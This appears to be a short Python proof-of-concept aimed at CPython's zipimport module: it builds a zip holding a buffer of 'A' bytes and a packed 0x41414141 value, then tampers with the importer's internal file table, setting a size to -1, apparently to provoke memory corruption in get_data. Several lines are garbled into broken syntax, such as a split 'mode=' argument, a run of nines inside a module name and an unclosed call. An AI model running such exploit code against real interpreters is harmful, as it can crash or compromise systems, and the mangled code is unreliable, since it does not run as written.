import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zup'

payload = bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFile(ZIP, mode
importer = zi='w')
zf.write(FILE)
zf.close()

importer = zipimport9999999999999999999999.zipimporter(ZIP)
f = list(importer._port.zipimporter(ZIP) # compress
f[2] = -1 # file size
importer._files[FILE] = tuple(f)
print(importer.get_data(FILE))
